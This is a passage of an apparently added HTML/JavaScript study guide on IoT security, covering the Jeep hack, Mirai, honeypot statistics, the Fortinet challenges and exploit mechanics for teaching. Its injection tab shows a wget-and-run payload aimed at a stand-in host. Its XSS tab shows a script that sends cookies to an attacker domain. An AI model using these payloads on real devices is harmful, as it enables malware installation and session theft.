+            <div style="margin-top:0.85rem;font-family:var(--font-mono);font-size:0.74rem;color:var(--accent-cyan);">[Inspect Telemetry &rarr;]</div>
+          </div>
+
+          <div class="product-card" data-product="canedge">
+            <div>
+              <div class="product-icon" style="color:var(--accent-amber);border-color:rgba(245,158,11,0.35);background:rgba(245,158,11,0.12);">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 17H4a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h16a2 2 0 0 1 2 2v10a2 2 0 0 1-2 2h-1"/><polygon points="12 15 17 21 7 21 12 15"/></svg>
+              </div>
+              <h4 style="font-size:0.98rem;margin-bottom:0.35rem;">CANedge2 J1939 Logger</h4>
+              <p style="font-size:0.83rem;color:var(--text-secondary);">Standalone Wi-Fi CAN bus data logger for heavy-duty fleet telematics &amp; vehicle diagnostics.</p>
+            </div>
+            <div style="margin-top:0.85rem;font-family:var(--font-mono);font-size:0.74rem;color:var(--accent-amber);">[Inspect Telemetry &rarr;]</div>
+          </div>
+
+          <div class="product-card" data-product="bloomlife">
+            <div>
+              <div class="product-icon" style="color:var(--accent-emerald);border-color:rgba(16,185,129,0.35);background:rgba(16,185,129,0.12);">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg>
+              </div>
+              <h4 style="font-size:0.98rem;margin-bottom:0.35rem;">Bloomlife Pregnancy Monitor</h4>
+              <p style="font-size:0.83rem;color:var(--text-secondary);">Commercial wearable health sensor placed on expectant mothers to track contractions.</p>
+            </div>
+            <div style="margin-top:0.85rem;font-family:var(--font-mono);font-size:0.74rem;color:var(--accent-emerald);">[Inspect Telemetry &rarr;]</div>
+          </div>
+        </div>
+
+        <div class="telemetry-drawer" id="productTelemetryDrawer">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <!-- 5 Application Domains Explorer -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-cyan)" stroke-width="2"><polygon points="12 2 2 7 12 12 22 7 12 2"/><polyline points="2 17 12 22 22 17"/><polyline points="2 12 12 17 22 12"/></svg>
+            The 5 Application Domains of IoT
+          </h3>
+          <span class="tag tag-amber">Domain Taxonomy</span>
+        </div>
+
+        <div class="filter-bar" id="domainFilterBar">
+          <button class="filter-btn active" data-domain="all">All 5 Domains</button>
+          <button class="filter-btn" data-domain="consumer">1. Consumer IoT</button>
+          <button class="filter-btn" data-domain="commercial">2. Commercial IoT</button>
+          <button class="filter-btn" data-domain="industrial">3. Industrial IoT (IIoT)</button>
+          <button class="filter-btn" data-domain="infrastructure">4. Infrastructure IoT</button>
+          <button class="filter-btn" data-domain="military">5. Military Things (IoMT)</button>
+        </div>
+
+        <div class="grid-2" id="domainCardsContainer">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <div class="module-footer-nav">
+        <span style="font-size:0.82rem;color:var(--text-muted);">Module 1 of 5</span>
+        <button class="btn-primary" onclick="goToModule(2)">Next: Real-World Attack Cases &rarr;</button>
+      </div>
+    </section>
+
+    <!-- ==================== MODULE 2 ==================== -->
+    <section class="module-section" id="module-2">
+      <div class="module-header">
+        <div>
+          <div class="module-eyebrow">Module 02 // Threat Intelligence</div>
+          <h2 class="module-title">Real-World IoT Attack Case Studies &amp; Threat Scale</h2>
+          <p class="module-desc">Examine landmark cyber-physical and volumetric botnet incidents that demonstrated how insecure IoT hardware threatens physical safety and global Internet infrastructure.</p>
+        </div>
+        <span class="tag tag-coral">Case Studies</span>
+      </div>
+
+      <!-- Case Study 1: 2015 Jeep Wireless Hack -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-coral)" stroke-width="2"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+            Case Study 1: The Jeep Wireless Hack (2015)
+          </h3>
+          <span class="tag tag-coral">Charlie Miller &amp; Chris Valasek</span>
+        </div>
+
+        <p style="font-size:0.9rem;color:var(--text-secondary);margin-bottom:1.1rem;">
+          Click each stage of the kill chain below to trace how researchers compromised a Jeep Cherokee remotely over cellular networks and bridged into safety-critical physical actuators:
+        </p>
+
+        <div class="attack-chain" id="jeepAttackChain">
+          <div class="chain-step active" data-step="0">
+            <div class="chain-step-num">STAGE 01 // ENTRY</div>
+            <h4 style="font-size:0.92rem;">Uconnect Cellular Vector</h4>
+            <p style="font-size:0.78rem;color:var(--text-secondary);margin-top:4px;">Remote wireless exploit via Sprint cellular IP</p>
+          </div>
+          <div class="chain-step" data-step="1">
+            <div class="chain-step-num">STAGE 02 // PIVOT</div>
+            <h4 style="font-size:0.92rem;">CAN Bus Traversal</h4>
+            <p style="font-size:0.78rem;color:var(--text-secondary);margin-top:4px;">Reprogramming gateway chip to reach internal CAN</p>
+          </div>
+          <div class="chain-step" data-step="2">
+            <div class="chain-step-num">STAGE 03 // CABIN</div>
+            <h4 style="font-size:0.92rem;">Infotainment &amp; Controls</h4>
+            <p style="font-size:0.78rem;color:var(--text-secondary);margin-top:4px;">Radio volume/stations, wipers, and max A/C</p>
+          </div>
+          <div class="chain-step" data-step="3">
+            <div class="chain-step-num">STAGE 04 // LETHAL RISK</div>
+            <h4 style="font-size:0.92rem;">Highway Accelerator Kill</h4>
+            <p style="font-size:0.78rem;color:var(--text-secondary);margin-top:4px;">Disabling transmission/accelerator at 70 mph</p>
+          </div>
+        </div>
+
+        <div class="chain-detail-panel" id="jeepDetailPanel">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <!-- Case Study 2: 2016 Mirai Botnet -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-amber)" stroke-width="2"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+            Case Study 2: The Mirai Botnet Attacks (2016)
+          </h3>
+          <span class="tag tag-amber">Volumetric DDoS</span>
+        </div>
+
+        <div class="stat-banner">
+          <div class="stat-box">
+            <div class="stat-value">630 Gbps</div>
+            <div class="stat-label">Sept 2016: <em>KrebsOnSecurity</em> DDoS</div>
+          </div>
+          <div class="stat-box">
+            <div class="stat-value coral">1.1 Tbps</div>
+            <div class="stat-label">Sept 2016: French Web Host <strong>OVH</strong></div>
+          </div>
+          <div class="stat-box">
+            <div class="stat-value cyan">Oct 2016</div>
+            <div class="stat-label"><strong>Dyn DNS</strong> Outage (Amazon, Netflix, Twitter, NYT)</div>
+          </div>
+        </div>
+
+        <div class="viz-container" style="margin-bottom:1.15rem;">
+          <canvas id="miraiChartCanvas" height="210"></canvas>
+        </div>
+
+        <div class="grid-2">
+          <div class="concept-box amber">
+            <h4>Exploitation Vector</h4>
+            <p>Scanned the public Internet (Telnet/SSH) for vulnerable consumer IoT devices—primarily <strong>IP security cameras</strong> and <strong>home routers</strong>—configured with hardcoded factory-default usernames and passwords.</p>
+          </div>
+          <div class="concept-box coral">
+            <h4>Evolved Mirai Variants (Must Know)</h4>
+            <p>After Mirai's source code leaked, threat actors spawned new variants:</p>
+            <div class="variant-chips">
+              <span class="variant-chip">Hajime</span>
+              <span class="variant-chip">Hide 'N Seek</span>
+              <span class="variant-chip">Masuta</span>
+              <span class="variant-chip">PureMasuta</span>
+              <span class="variant-chip">Wicked botnet</span>
+              <span class="variant-chip">Okiru</span>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Case Study 3: Kaspersky Honeypot Statistics -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-emerald)" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            Kaspersky IoT Honeypot Threat Intelligence (H1 2019)
+          </h3>
+          <span class="tag tag-emerald">Empirical Scale</span>
+        </div>
+
+        <div class="grid-2" style="align-items:center;">
+          <div class="stat-banner" style="margin-bottom:0;">
+            <div class="stat-box">
+              <div class="stat-value coral">&gt; 105 Million</div>
+              <div class="stat-label">Total Attacks Recorded in H1 2019</div>
+            </div>
+            <div class="stat-box">
+              <div class="stat-value cyan">276,000</div>
+              <div class="stat-label">Unique Attacking IP Addresses</div>
+            </div>
+          </div>
+          <div class="concept-box">
+            <h4>Key Takeaway on Threat Attribution</h4>
+            <p>Kaspersky's specialized IoT honeypots (decoy vulnerable devices) observed over <strong>105 million attacks</strong> originating from <strong>276,000 unique IP addresses</strong> in just the first half of 2019—demonstrating automated, relentless global scanning against unmanaged smart home devices.</p>
+          </div>
+        </div>
+      </div>
+
+      <div class="module-footer-nav">
+        <button class="btn-secondary" onclick="goToModule(1)">&larr; Previous: IoT Fundamentals</button>
+        <button class="btn-primary" onclick="goToModule(3)">Next: Attack Mapping &amp; Challenges &rarr;</button>
+      </div>
+    </section>
+
+    <!-- ==================== MODULE 3 ==================== -->
+    <section class="module-section" id="module-3">
+      <div class="module-header">
+        <div>
+          <div class="module-eyebrow">Module 03 // Systemic Weaknesses</div>
+          <h2 class="module-title">Network Attack Mapping &amp; The 5 IoT Security Challenges</h2>
+          <p class="module-desc">Connect foundational network attacks to their underlying architectural flaws and master the Fortinet Taxonomy of the 5 primary IoT security challenges.</p>
+        </div>
+        <span class="tag tag-amber">Vulnerability Analysis</span>
+      </div>
+
+      <!-- Interactive Vulnerability Matcher -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-cyan)" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
+            Interactive Network Attack &rarr; Underlying Weakness Matcher
+          </h3>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <span class="tag tag-emerald" id="matchScoreTag">0 / 5 Matched</span>
+            <button class="btn-secondary" style="padding:5px 11px;font-size:0.78rem;" id="resetMatcherBtn">Reset</button>
+          </div>
+        </div>
+
+        <p style="font-size:0.88rem;color:var(--text-secondary);margin-bottom:1.1rem;">
+          Select a <strong>Network Attack</strong> on the left, then click the corresponding <strong>Exploited Security Weakness</strong> on the right to verify your revision recall:
+        </p>
+
+        <div class="matcher-grid">
+          <div>
+            <div style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-cyan);margin-bottom:0.5rem;font-weight:700;">1. SELECT NETWORK ATTACK</div>
+            <div class="match-col" id="attackCol"></div>
+          </div>
+          <div>
+            <div style="font-family:var(--font-mono);font-size:0.75rem;color:var(--accent-amber);margin-bottom:0.5rem;font-weight:700;">2. SELECT EXPLOITED WEAKNESS</div>
+            <div class="match-col" id="weaknessCol"></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Fortinet Taxonomy: 5 Primary IoT Security Challenges -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-coral)" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
+            The 5 Primary IoT Security Challenges (Fortinet Taxonomy)
+          </h3>
+          <button class="btn-secondary" style="padding:5px 11px;font-size:0.78rem;" id="expandAllChallengesBtn">Expand All</button>
+        </div>
+
+        <div id="fortinetAccordion">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <div class="module-footer-nav">
+        <button class="btn-secondary" onclick="goToModule(2)">&larr; Previous: Case Studies</button>
+        <button class="btn-primary" onclick="goToModule(4)">Next: Exploit Mechanics &amp; Botnets &rarr;</button>
+      </div>
+    </section>
+
+    <!-- ==================== MODULE 4 ==================== -->
+    <section class="module-section" id="module-4">
+      <div class="module-header">
+        <div>
+          <div class="module-eyebrow">Module 04 // Offensive Mechanics</div>
+          <h2 class="module-title">Exploit Mechanics, MitM, Botnets &amp; Data Harvesting</h2>
+          <p class="module-desc">Simulate memory corruption on constrained IoT hardware, compare passive sniffing vs. active spoofing, trace botnet C2 enslavement, and audit device exfiltration risks.</p>
+        </div>
+        <span class="tag tag-coral">Exploit Lab</span>
+      </div>
+
+      <!-- 4.1 Interactive Vulnerability Exploit Lab -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-coral)" stroke-width="2"><polyline points="16 18 22 12 16 6"/><polyline points="8 6 2 12 8 18"/></svg>
+            4.1 Software Exploit Mechanics on Stripped-Down Linux IoT OS
+          </h3>
+          <span class="tag tag-coral">Interactive Lab</span>
+        </div>
+
+        <div class="tab-bar" id="exploitTabs">
+          <button class="tab-btn active" data-tab="overflow">Buffer Overflow (RAM Simulator)</button>
+          <button class="tab-btn" data-tab="injection">Command / Code Injection</button>
+          <button class="tab-btn" data-tab="xss">Cross-Site Scripting (XSS)</button>
+        </div>
+
+        <!-- Tab 1: Buffer Overflow Interactive Visualizer -->
+        <div id="tab-overflow" class="exploit-tab-content">
+          <p style="font-size:0.88rem;color:var(--text-secondary);margin-bottom:0.85rem;">
+            IoT devices have severely constrained RAM footprints. Drag the slider to increase input payload length beyond the <strong>12-byte allocated input buffer</strong> and observe how excess bytes overwrite adjacent <strong>Execution Return Pointers (EIP/PC)</strong>:
+          </p>
+
+          <div style="background:#0b1120;border:1px solid var(--border-color);border-radius:var(--radius-md);padding:1.15rem;">
+            <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:0.75rem;">
+              <label for="payloadSlider" style="font-family:var(--font-mono);font-size:0.84rem;font-weight:700;">
+                Input Payload Length: <span id="payloadLenVal" style="color:var(--accent-cyan);">8 bytes</span> / 12-byte Buffer
+              </label>
+              <span id="memoryStatusBadge" class="tag tag-emerald">SAFE: Within Allocated Buffer</span>
+            </div>
+
+            <input type="range" id="payloadSlider" min="1" max="16" value="8" style="width:100%;margin:0.85rem 0;accent-color:var(--accent-cyan);cursor:pointer;">
+
+            <div style="display:flex;gap:1.25rem;font-size:0.75rem;font-family:var(--font-mono);color:var(--text-secondary);flex-wrap:wrap;">
+              <span><span style="display:inline-block;width:10px;height:10px;background:var(--accent-cyan);border-radius:2px;margin-right:5px;"></span>Bytes 00–11: Allocated Input Buffer</span>
+              <span><span style="display:inline-block;width:10px;height:10px;background:var(--accent-amber);border-radius:2px;margin-right:5px;"></span>Bytes 12–15: Execution Pointer / Program Code</span>
+              <span><span style="display:inline-block;width:10px;height:10px;background:var(--accent-coral);border-radius:2px;margin-right:5px;"></span>Corrupted Memory Overflow</span>
+            </div>
+
+            <div class="ram-cells" id="ramCellsContainer"></div>
+
+            <div id="overflowExplanation" style="font-size:0.84rem;color:var(--text-secondary);padding-top:0.5rem;border-top:1px solid var(--border-color);">
+              <strong>Normal Execution:</strong> Input fits inside the 12-byte buffer. Adjacent execution pointers remain intact.
+            </div>
+          </div>
+        </div>
+
+        <!-- Tab 2: Code Injection -->
+        <div id="tab-injection" class="exploit-tab-content" style="display:none;">
+          <div class="grid-2">
+            <div class="concept-box coral">
+              <h4>Mechanism &amp; Impact</h4>
+              <p><strong>Mechanism:</strong> Unsanitized user inputs from configuration forms or APIs are passed directly into underlying system command interpreters (e.g., BusyBox <code>/bin/sh</code>).</p>
+              <p style="margin-top:0.5rem;"><strong>Impact:</strong> Executes arbitrary system-level commands (downloading botnet binaries, adding root users) without administrative authorization.</p>
+            </div>
+            <div style="background:#0b1120;border:1px solid var(--border-color);border-radius:var(--radius-md);padding:1rem;font-family:var(--font-mono);font-size:0.8rem;">
+              <div style="color:var(--text-muted);margin-bottom:0.4rem;">// Vulnerable IoT Router Ping Utility</div>
+              <div style="color:var(--accent-cyan);">system("ping -c 1 " + user_ip_input);</div>
+              <div style="color:var(--text-muted);margin:0.65rem 0 0.35rem;">// Malicious Attacker Payload:</div>
+              <div style="color:var(--accent-coral);">127.0.0.1; wget http://evil.io/mirai.sh | sh</div>
+              <div style="color:var(--accent-amber);margin-top:0.65rem;font-size:0.75rem;">&rarr; Shell executes ping AND downloads malware with root privileges!</div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Tab 3: Cross-Site Scripting (XSS) -->
+        <div id="tab-xss" class="exploit-tab-content" style="display:none;">
+          <div class="grid-2">
+            <div class="concept-box amber">
+              <h4>Mechanism &amp; Impact</h4>
+              <p><strong>Mechanism:</strong> Vulnerable web-based management interfaces embedded inside IP cameras, smart plugs, and home routers fail to escape HTML/JS input.</p>
+              <p style="margin-top:0.5rem;"><strong>Impact:</strong> Injects malicious JavaScript into administrative web dashboards to steal session cookies, change DNS settings, or hijack device control sessions.</p>
+            </div>
+            <div style="background:#0b1120;border:1px solid var(--border-color);border-radius:var(--radius-md);padding:1rem;font-family:var(--font-mono);font-size:0.8rem;">
+              <div style="color:var(--text-muted);margin-bottom:0.4rem;">// Stored XSS in Camera Device Name Field</div>
+              <div style="color:var(--accent-coral);">&lt;script&gt;fetch('https://attacker.io/steal?c='+document.cookie)&lt;/script&gt;</div>
+              <div style="color:var(--accent-emerald);margin-top:0.65rem;font-size:0.75rem;">&rarr; Triggers whenever an admin opens the local device web portal.</div>
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- 4.2 Password Attacks & Credential Exploitation -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-amber)" stroke-width="2"><path d="M21 2l-2 2m-7.61 7.61a5.5 5.5 0 1 1-7.778 7.778 5.5 5.5 0 0 1 7.777-7.777zm0 0L15.5 7.5m0 0l3 3L22 7l-3-3m-3.5 3.5L19 4"/></svg>
+            4.2 Password Attacks &amp; Credential Exploitation
+          </h3>
+          <span class="tag tag-amber">~60% Password Reuse</span>
+        </div>
+
+        <div class="concept-pill-grid" style="margin-bottom:0;">
+          <div class="concept-box">
+            <h4>Unmonitored Event Logs</h4>
+            <p>Dictionary and brute-force attacks routinely succeed because constrained IoT devices lack logging, rate-limiting, and auditing mechanisms for failed login attempts.</p>
+          </div>
+          <div class="concept-box amber">
+            <h4>Lifetime Default Configuration</h4>
+            <p>Consumer and industrial IoT devices are commonly <strong>"installed once in a lifetime"</strong> with factory default credentials (e.g., <code>admin/admin</code>) left permanently intact.</p>
+          </div>
+          <div class="concept-box coral">
+            <h4>~60% Password Reuse Risk</h4>
+            <p>Studies show <strong>nearly 60% of users reuse the same password</strong> across multiple devices. Compromising one low-security IoT gadget grants lateral access across all network devices.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 4.3 Interactive MitM: IoT Sniffing vs IoT Spoofing -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-cyan)" stroke-width="2"><path d="M5 12.55a11 11 0 0 1 14.08 0"/><path d="M1.42 9a16 16 0 0 1 21.16 0"/><path d="M8.53 16.11a6 6 0 0 1 6.95 0"/><line x1="12" y1="20" x2="12.01" y2="20"/></svg>
+            4.3 Man-in-the-Middle (MitM): IoT Sniffing vs. IoT Spoofing
+          </h3>
+          <div style="display:flex;gap:6px;">
+            <button class="filter-btn active" id="mitmSniffBtn">Mode A: IoT Sniffing (Passive)</button>
+            <button class="filter-btn" id="mitmSpoofBtn">Mode B: IoT Spoofing (Active)</button>
+          </div>
+        </div>
+
+        <div class="viz-container" style="margin-bottom:1rem;">
+          <canvas id="mitmCanvas" height="220"></canvas>
+        </div>
+
+        <div id="mitmDescriptionBox" class="concept-box">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <!-- 4.4 Animated Botnet Enslavement Workflow -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-coral)" stroke-width="2"><rect x="2" y="2" width="20" height="8" rx="2"/><rect x="2" y="14" width="20" height="8" rx="2"/><line x1="6" y1="6" x2="6.01" y2="6"/><line x1="6" y1="18" x2="6.01" y2="18"/></svg>
+            4.4 Botnet Enslavement Workflow &amp; Malicious Payloads
+          </h3>
+          <span class="tag tag-coral">C2 Architecture</span>
+        </div>
+
+        <div class="viz-container" style="margin-bottom:1rem;">
+          <canvas id="botnetCanvas" height="190"></canvas>
+        </div>
+
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:0.85rem;">
+          <div class="concept-box coral">
+            <h4>1. Volumetric DDoS</h4>
+            <p>Flooding targets (e.g., Dyn DNS, OVH) with massive synchronized traffic.</p>
+          </div>
+          <div class="concept-box amber">
+            <h4>2. Spam &amp; Phishing</h4>
+            <p>Relaying high-volume spam emails from distributed residential IPs.</p>
+          </div>
+          <div class="concept-box">
+            <h4>3. Click Fraud</h4>
+            <p>Automated fraudulent ad clicks generating illicit advertising revenue.</p>
+          </div>
+          <div class="concept-box emerald">
+            <h4>4. Crypto / Bitcoin Mining</h4>
+            <p>Hijacking collective IoT CPU cycles to mine cryptocurrency.</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- 4.5 Interactive Sensitive Data Harvesting Matrix -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-emerald)" stroke-width="2"><ellipse cx="12" cy="5" rx="9" ry="3"/><path d="M21 12c0 1.66-4 3-9 3s-9-1.34-9-3"/><path d="M3 5v14c0 1.66 4 3 9 3s9-1.34 9-3V5"/></svg>
+            4.5 Sensitive Data Harvesting Matrix by IoT Device Type
+          </h3>
+          <span class="tag tag-cyan">Click a Device</span>
+        </div>
+
+        <div class="device-grid" id="harvestDeviceGrid">
+          <!-- Populated by JS -->
+        </div>
+
+        <div class="telemetry-drawer" id="harvestOutputDrawer" style="border-color:rgba(244,63,94,0.4);">
+          <!-- Populated by JS -->
+        </div>
+      </div>
+
+      <div class="module-footer-nav">
+        <button class="btn-secondary" onclick="goToModule(3)">&larr; Previous: Attack Mapping &amp; Challenges</button>
+        <button class="btn-primary" onclick="goToModule(5)">Next: Exam Readiness Quiz &rarr;</button>
+      </div>
+    </section>
+
+    <!-- ==================== MODULE 5 ==================== -->
+    <section class="module-section" id="module-5">
+      <div class="module-header">
+        <div>
+          <div class="module-eyebrow">Module 05 // Active Recall</div>
+          <h2 class="module-title">Exam Readiness Self-Assessment Quiz</h2>
+          <p class="module-desc">Test your mastery of Week 11 IoT Security concepts, case studies, Fortinet challenges, and exploit mechanics with 10 exam-style questions.</p>
+        </div>
+        <div style="display:flex;align-items:center;gap:10px;">
+          <span class="tag tag-emerald" id="quizScoreBadge">Score: 0 / 10</span>
+          <button class="btn-secondary" style="padding:6px 12px;font-size:0.8rem;" id="resetQuizBtn">Reset Quiz</button>
+        </div>
+      </div>
+
+      <div id="quizContainer">
+        <!-- Populated by JS -->
+      </div>
+
+      <div class="card" id="quizSummaryCard" style="display:none;border-color:var(--accent-emerald);text-align:center;">
+        <h3 style="font-size:1.35rem;margin-bottom:0.5rem;" id="quizFinalHeadline">Assessment Complete!</h3>
+        <p style="color:var(--text-secondary);margin-bottom:1rem;" id="quizFinalSubtext"></p>
+        <button class="btn-primary" onclick="resetQuiz()">Retake Quiz</button>
+      </div>
+
+      <div class="module-footer-nav">
+        <button class="btn-secondary" onclick="goToModule(4)">&larr; Previous: Exploit Mechanics</button>
+        <button class="btn-primary" onclick="goToModule(1)">Return to Module 01 &#8634;</button>
+      </div>
+    </section>
+
+  </main>
+
+  <div class="toast" id="toastNotification">HTML Study Guide downloaded!</div>
+
+<script>
+(function() {
+  'use strict';
+
+  // ==================== STATE MANAGEMENT ====================
+  const state = {
+    currentModule: 1,
+    visitedModules: new Set([1]),
+    selectedProduct: 'hitachi',
+    selectedDomainFilter: 'all',
+    jeepStep: 0,
+    matchedPairs: new Set(),
+    selectedAttack: null,
+    selectedWeakness: null,
+    mitmMode: 'sniffing', // 'sniffing' or 'spoofing'
+    selectedHarvestDevice: 'smart_tv',
+    quizAnswers: {},
+    growthAnimProgress: 0,
+    hoveredBarIndex: -1
+  };
+
+  // ==================== DATA DEFINITIONS ====================
+  const productTelemetryData = {
+    hitachi: {
+      title: 'Hitachi R-ZXC740KS / R-ZXC740K Smart Refrigerator',
+      domain: 'Consumer IoT',
+      protocol: 'Wi-Fi / Cloud Companion Mobile App',
+      telemetry: [
+        'Door Open/Close Frequency Telemetry: July 6 (9 times) | July 7 (21 times) | July 8 (13 times)',
+        'Real-Time Status Alert: "Water tank: Water supply low"',
+        'Security Note: Reveals household occupancy patterns (when residents are awake/home) if cloud APIs or home Wi-Fi lack encryption.'
+      ]
+    },
+    canedge: {
+      title: 'CANedge2 J1939 Data Logger',
+      domain: 'Commercial / Industrial Fleet Telematics',
+      protocol: 'Wi-Fi + J1939 Controller Area Network (CAN Bus)',
+      telemetry: [
+        'Function: Standalone dual-channel CAN bus data logger with Wi-Fi transfer for heavy-duty vehicles.',
+        'Captured Signals: Engine RPM, vehicle speed, fault diagnostics, GPS fleet position.',
+        'Security Note: Direct interface to vehicle CAN bus requires strict Wi-Fi authentication and encrypted firmware updates.'
+      ]
+    },
+    bloomlife: {
+      title: 'Bloomlife Smart Pregnancy Monitor',
+      domain: 'Commercial IoT (Healthcare Wearable)',
+      protocol: 'Bluetooth Low Energy (BLE) &rarr; Smartphone App',
+      telemetry: [
+        'Function: Wearable patch sensor placed on pregnant mothers to track uterine contractions.',
+        'Captured Signals: Electrohysterography (EHG) physiological contraction frequency & duration.',
+        'Security Note: Sensitive personal medical data; unauthenticated BLE or unencrypted transit exposes patient privacy.'
+      ]
+    }
+  };
+
+  const iotDomains = [
+    {
+      id: 'consumer',
+      name: '1. Consumer IoT',
+      tag: 'Household',
+      tagClass: 'tag-cyan',
+      desc: 'Connected electronics and smart appliances designed for personal household convenience and home automation.',
+      examples: 'Smart light fixtures, Hitachi smart refrigerators, voice assistants (Alexa/Google Home) for elderly care.'
+    },
+    {
+      id: 'commercial',
+      name: '2. Commercial IoT',
+      tag: 'Healthcare & Transit',
+      tagClass: 'tag-emerald',
+      desc: 'Operational IoT deployments within commercial healthcare facilities and intelligent transportation systems.',
+      examples: 'Smart pacemakers, remote patient monitoring systems, Vehicle-to-Vehicle (V2V) communications.'
+    },
+    {
+      id: 'industrial',
+      name: '3. Industrial IoT (IIoT)',
+      tag: 'Manufacturing & Agri',
+      tagClass: 'tag-amber',
+      desc: 'Large-scale automated control and sensor networks used in manufacturing plants, agriculture, and heavy industry.',
+      examples: 'Digital Control Systems (DCS), statistical process evaluation, smart agriculture sensors, industrial big data analytics.'
+    },
+    {
+      id: 'infrastructure',
+      name: '4. Infrastructure IoT',
+      tag: 'Smart Cities',
+      tagClass: 'tag-cyan',
+      desc: 'Municipal infrastructure sensors and public smart city management systems.',
+      examples: 'Smart city traffic flow sensors, municipal utility management systems, public service mobile apps.'
+    },
+    {
+      id: 'military',
+      name: '5. Military Things (IoMT)',
+      tag: 'Defense & Combat',
+      tagClass: 'tag-coral',
+      desc: 'Defense, battlefield awareness, and combat-oriented mission-critical IoT deployments.',
+      examples: 'Autonomous surveillance robots, soldier-wearable biometric sensors for real-time combat health monitoring.'
+    }
+  ];
+
+  const jeepStages = [
+    {
+      title: 'Stage 01: Remote Cellular Exploitation (Uconnect)',
+      detail: 'Security researchers Charlie Miller and Chris Valasek discovered an unauthenticated remote vulnerability in Chrysler’s Uconnect infotainment system exposed over Sprint’s cellular network, allowing remote code execution from anywhere in the country.'
+    },
+    {
+      title: 'Stage 02: Pivot to Internal CAN Bus',
+      detail: 'After gaining shell access on the Uconnect head unit, the attackers reflashed a secondary V850 gateway chip to bridge commands directly onto the vehicle’s internal Controller Area Network (CAN bus), which lacks message authentication.'
+    },
+    {
+      title: 'Stage 03: Cabin & Physical Accessory Hijack',
+      detail: 'Injecting spoofed CAN bus frames allowed the attackers to hijack the center media display, change radio stations at maximum volume, turn on windshield wipers, and blast the air conditioning.'
+    },
+    {
+      title: 'Stage 04: Critical Safety Impact — Highway Accelerator Disable',
+      detail: 'Most critically, the researchers transmitted diagnostic/control frames that cut transmission torque and disabled the accelerator while the vehicle was traveling at highway speeds (70 mph), resulting in a 1.4-million-vehicle Chrysler recall.'
+    }
+  ];
+
+  const networkMatchPairs = [
+    { id: 'dos', attack: 'DoS & DDoS Attacks', weakness: 'Open TCP/UDP service ports' },
+    { id: 'mitm', attack: 'Man-in-the-Middle (MitM) Attacks', weakness: 'Unsecured physical or wireless network access points' },
+    { id: 'sniff', attack: 'Packet Sniffing', weakness: 'Unencrypted network traffic containing credentials or payloads' },
+    { id: 'scan', attack: 'Port Scanning', weakness: 'Unfiltered network service ports' },
+    { id: 'arp', attack: 'ARP Spoofing', weakness: 'Unsecured physical switch ports connected to malicious actors' }
+  ];
+
+  const fortinetChallenges = [
+    {
+      num: '01',
